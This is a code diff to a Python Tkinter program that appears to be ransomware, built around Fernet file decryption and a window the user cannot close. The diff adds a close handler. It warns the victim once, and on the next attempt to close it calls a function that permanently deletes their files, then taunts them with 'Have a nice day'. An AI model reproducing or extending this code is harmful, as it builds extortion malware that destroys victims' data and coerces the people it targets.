@@ -27,7 +27,14 @@ def gui_decrypt_files(file_paths, fernet, key):
 
 #Function to display message and prevent program from closing when user tries to exit out
 def on_close():
-    messagebox.showinfo(title = 'Unable to close', message = 'Cannot close program')
+    global close_counter
+    if close_counter == 0:
+        messagebox.showinfo(title = 'Do Not Close This Program', message = 'This is your second and final warning. If you attempt to close the program one more time, your files will be permanently deleted.')
+        close_counter += 1
+    elif close_counter == 1:
+        encrypter.delete_everything(file_paths)
+        messagebox.showinfo(title = 'Files Deleted', message = 'You have been warned. Your files have now been permanently deleted. Have a nice day.')
+        root.destroy()
 
 
 # GUI Stuff / Main Program Loop ==========================================================================================================================================================
@@ -154,7 +161,7 @@ def tab2():
 # ====================================================================================================================================================================================
 
 if files_generated == True:
-    tab2()
+    root.after(5000,tab2)
 
 # Running main program loop
 def main():
